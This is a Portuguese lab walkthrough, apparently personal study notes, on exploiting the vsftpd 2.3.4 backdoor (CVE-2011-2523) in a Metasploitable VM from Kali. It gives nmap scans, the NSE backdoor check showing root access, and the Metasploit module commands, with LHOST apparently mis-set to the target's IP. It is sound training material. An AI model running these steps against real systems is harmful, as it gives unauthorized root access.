# Instruções
1. Instalar Virtual Box
2. Instalar Metasploitable
   * https://www.rapid7.com/products/metasploit/metasploitable/
4. Instalar Kali - Virtualbox
   * https://www.kali.org/get-kali/#kali-virtual-machines

# Credenciais
### Metasploitable
* **Login:** msfadmin
* **Senha:** msfadmin
### Kali
* **Login:** kali
* **Senha:** kali

### Varredora das portas do Metasploitable
`sudo nmap -sS 192.168.56.101(ip do metasploitable)`

### Saber a versão que está sendo usado (sv) e -o para saber o S.O.
`sudo nmap -sV -O -p 21, 22, 80 192.168.56.101`

#### Resultado
`PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
MAC Address: 08:00:27:36:C6:B0 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
`
#### Porta escolhida 21 - ftp
* Salvando saída somente da porta 21
  * `sudo nmap -sV -p 21 -oN resultadoFTP 192.168.56.101`

### Testar o backdoor do ftp
`sudo nmap --script ftp-vsftpd-backdoor.nse -p 21 192.168.56.101`
#### Saída
`PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523  BID:48539
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|       https://www.securityfocus.com/bid/48539
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|_      http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
MAC Address: 08:00:27:36:C6:B0 (Oracle VirtualBox virtual NIC)`

### Buscar no exploit - kali possui integração então é só utilizar
`searchsploit vsftpd 2.3.4`

### Abrir console
`msfconsole`
#### Ao estar no console no msf digitar
`search CVE-2011-2523`

#### A
`use exploit/unix/ftp/vsftpd_234_backdoor`
`show options`
`set RHOSTS 192.168.56.102` - IP que vamos atacar
`set LHOST 192.168.56.102` - IP remoto (o nosso)
`exploit` - tentar acesso ao nosso alvo
`cd /home/msfadmin` - acessar pasta home do Metasploitable
